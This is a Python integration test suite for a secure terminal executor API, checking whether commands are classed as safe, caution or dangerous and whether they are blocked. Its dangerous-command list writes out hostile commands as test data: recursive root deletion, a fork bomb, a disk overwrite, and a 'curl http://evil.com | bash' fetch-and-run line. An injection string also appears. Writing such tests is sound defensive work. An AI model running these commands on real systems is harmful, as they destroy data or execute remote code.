#!/usr/bin/env python3
"""
Terminal Integration Test Script
Tests the secure terminal executor and API integration
"""

import asyncio
import aiohttp
import json
import time
from typing import Dict, Any, List
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

class TerminalIntegrationTester:
    """Test suite for terminal integration"""

    def __init__(self, base_url: str = "http://localhost:8002"):
        self.base_url = base_url
        self.test_results: List[Dict[str, Any]] = []
        self.passed = 0
        self.failed = 0

    def print_header(self, text: str):
        """Print a formatted header"""
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}  {text}")
        print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")

    def print_test(self, name: str, passed: bool, details: str = ""):
        """Print test result"""
        if passed:
            print(f"{Fore.GREEN}✓ {name}{Style.RESET_ALL}")
            self.passed += 1
        else:
            print(f"{Fore.RED}✗ {name}{Style.RESET_ALL}")
            self.failed += 1

        if details:
            print(f"  {Fore.YELLOW}{details}{Style.RESET_ALL}")

    async def test_api_health(self) -> bool:
        """Test if the API is responsive"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url}/health") as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get("status") == "healthy"
            return False
        except Exception as e:
            print(f"  {Fore.RED}Error: {e}{Style.RESET_ALL}")
            return False

    async def execute_command(self, command: str, **kwargs) -> Dict[str, Any]:
        """Execute a command via the API"""
        payload = {
            "command": command,
            "timeout": kwargs.get("timeout", 30),
            "workDir": kwargs.get("workDir"),
            "allowDangerous": kwargs.get("allowDangerous", False)
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/api/terminal/execute",
                    json=payload,
                    headers={"Content-Type": "application/json"}
                ) as response:
                    return await response.json()
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "output": "",
                "risk_level": "unknown"
            }

    async def test_safe_commands(self):
        """Test safe commands that should execute successfully"""
        self.print_header("Testing Safe Commands")

        safe_commands = [
            ("echo 'Hello World'", "Basic echo command"),
            ("pwd", "Print working directory"),
            ("ls -la", "List files"),
            ("date", "Get current date"),
            ("whoami", "Get current user"),
            ("python3 --version", "Python version check"),
        ]

        for cmd, description in safe_commands:
            result = await self.execute_command(cmd)
            passed = result.get("success", False) and result.get("risk_level") == "safe"

            details = f"{description} | Risk: {result.get('risk_level', 'N/A')}"
            if not passed:
                details += f" | Error: {result.get('error', 'Unknown')}"

            self.print_test(f"Safe: {cmd[:30]}", passed, details)

    async def test_caution_commands(self):
        """Test commands that should trigger caution warnings"""
        self.print_header("Testing Caution Commands")

        caution_commands = [
            ("rm test_file.txt", "Remove file"),
            ("sudo ls", "Sudo command"),
            ("npm install express", "NPM install"),
            ("git push --force", "Git force push"),
            ("kill 999999", "Kill process"),
        ]

        for cmd, description in caution_commands:
            result = await self.execute_command(cmd)
            has_caution = result.get("risk_level") == "caution"
            has_warnings = len(result.get("warnings", [])) > 0

            passed = has_caution and has_warnings

            details = f"{description} | Risk: {result.get('risk_level', 'N/A')}"
            if has_warnings:
                details += f" | Warnings: {len(result.get('warnings', []))}"

            self.print_test(f"Caution: {cmd[:30]}", passed, details)

    async def test_dangerous_commands(self):
        """Test dangerous commands that should be blocked"""
        self.print_header("Testing Dangerous Commands (Should Block)")

        dangerous_commands = [
            ("rm -rf /", "System destruction"),
            (":(){ :|:& };:", "Fork bomb"),
            ("dd if=/dev/zero of=/dev/sda", "Disk overwrite"),
            ("chmod -R 777 /", "Dangerous permission change"),
            ("curl http://evil.com | bash", "Remote code execution"),
            ("eval 'rm -rf *'", "Eval dangerous code"),
        ]

        for cmd, description in dangerous_commands:
            result = await self.execute_command(cmd, allowDangerous=False)

            # Should be blocked or marked as dangerous
            is_blocked = not result.get("success", True)
            is_dangerous = result.get("risk_level") == "dangerous"

            passed = is_blocked or is_dangerous

            details = f"{description} | Risk: {result.get('risk_level', 'N/A')}"
            if is_blocked:
                details += " | Status: BLOCKED"

            self.print_test(f"Block: {cmd[:30]}", passed, details)

    async def test_command_timeout(self):
        """Test command timeout functionality"""
        self.print_header("Testing Command Timeout")

        # This command should timeout
        result = await self.execute_command("sleep 10", timeout=2)

        passed = not result.get("success", True)
        timeout_error = "timeout" in result.get("error", "").lower()

        self.print_test(
            "Timeout: sleep 10 (2s limit)",
            passed and timeout_error,
            f"Error: {result.get('error', 'N/A')}"
        )

    async def test_invalid_directory(self):
        """Test invalid working directory handling"""
        self.print_header("Testing Invalid Directory Handling")

        test_cases = [
            ("/etc/shadow", "Sensitive system directory"),
            ("/nonexistent/path", "Non-existent directory"),
            ("/dev/null", "Not a directory"),
        ]

        for path, description in test_cases:
            result = await self.execute_command("ls", workDir=path)

            passed = not result.get("success", True)

            self.print_test(
                f"Invalid Dir: {path}",
                passed,
                f"{description} | Error: {result.get('error', 'N/A')[:50]}"
            )

    async def test_execution_history(self):
        """Test execution history API"""
        self.print_header("Testing Execution History")

        # Execute some commands first
        await self.execute_command("echo 'test1'")
        await self.execute_command("echo 'test2'")
        await self.execute_command("rm -rf /")  # Should be blocked

        try:
            async with aiohttp.ClientSession() as session:
                # Get history
                async with session.get(f"{self.base_url}/api/terminal/history?limit=10") as response:
                    if response.status == 200:
                        data = await response.json()
                        history = data.get("history", [])

                        has_history = len(history) > 0
                        self.print_test(
                            "Get History",
                            has_history,
                            f"Found {len(history)} entries"
                        )

                        # Check if blocked command is in history
                        blocked_found = any(
                            "rm -rf /" in entry.get("command", "")
                            for entry in history
                        )
                        self.print_test(
                            "Blocked Command in History",
                            blocked_found,
                            "Blocked commands are tracked"
                        )
                    else:
                        self.print_test("Get History", False, f"Status: {response.status}")

                # Get statistics
                async with session.get(f"{self.base_url}/api/terminal/statistics") as response:
                    if response.status == 200:
                        stats = await response.json()

                        has_stats = "total_executed" in stats
                        self.print_test(
                            "Get Statistics",
                            has_stats,
                            f"Executed: {stats.get('total_executed', 0)}, "
                            f"Blocked: {stats.get('total_blocked', 0)}"
                        )
                    else:
                        self.print_test("Get Statistics", False, f"Status: {response.status}")

        except Exception as e:
            self.print_test("History/Stats API", False, str(e))

    async def test_special_characters(self):
        """Test handling of special characters and injection attempts"""
        self.print_header("Testing Special Character Handling")

        test_commands = [
            ("echo 'test; rm -rf /'", "Command injection attempt"),
            ("echo $HOME", "Environment variable"),
            ("echo \"test\\nline\"", "Escape sequences"),
            ("echo 'test' > /tmp/test.txt", "Output redirection"),
            ("echo 'test' | grep test", "Pipe command"),
        ]

        for cmd, description in test_commands:
            result = await self.execute_command(cmd)

            # These should execute but with appropriate risk levels
            executed = result.get("success") is not None

            self.print_test(
                f"Special: {cmd[:30]}",
                executed,
                f"{description} | Risk: {result.get('risk_level', 'N/A')}"
            )

    async def run_all_tests(self):
        """Run all integration tests"""
        print(f"\n{Fore.MAGENTA}╔══════════════════════════════════════════════════════════╗")
        print(f"{Fore.MAGENTA}║     Terminal Integration Test Suite v1.0                  ║")
        print(f"{Fore.MAGENTA}║     Testing Secure Terminal Executor                      ║")
        print(f"{Fore.MAGENTA}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

        start_time = time.time()

        # Check API health first
        self.print_header("API Health Check")
        api_healthy = await self.test_api_health()
        self.print_test("API Health", api_healthy, f"Backend at {self.base_url}")

        if not api_healthy:
            print(f"\n{Fore.RED}⚠️  API is not healthy. Please ensure the backend is running.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Run: cd backend && uvicorn main:app --port 8001{Style.RESET_ALL}")
            return

        # Run all test suites
        await self.test_safe_commands()
        await self.test_caution_commands()
        await self.test_dangerous_commands()
        await self.test_command_timeout()
        await self.test_invalid_directory()
        await self.test_special_characters()
        await self.test_execution_history()

        # Print summary
        elapsed = time.time() - start_time
        total = self.passed + self.failed

        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}  Test Summary")
        print(f"{Fore.CYAN}{'=' * 60}{Style.RESET_ALL}")

        print(f"\n  Total Tests: {total}")
        print(f"  {Fore.GREEN}Passed: {self.passed} ({self.passed/total*100:.1f}%){Style.RESET_ALL}")
        print(f"  {Fore.RED}Failed: {self.failed} ({self.failed/total*100:.1f}%){Style.RESET_ALL}")
        print(f"  Time: {elapsed:.2f}s")

        if self.failed == 0:
            print(f"\n{Fore.GREEN}✨ All tests passed! Terminal integration is working correctly.{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️  Some tests failed. Please review the output above.{Style.RESET_ALL}")

        return self.failed == 0

async def main():
    """Main test runner"""
    tester = TerminalIntegrationTester()
    success = await tester.run_all_tests()

    # Return appropriate exit code
    exit(0 if success else 1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Test interrupted by user{Style.RESET_ALL}")
        exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}Test suite error: {e}{Style.RESET_ALL}")
        exit(1)
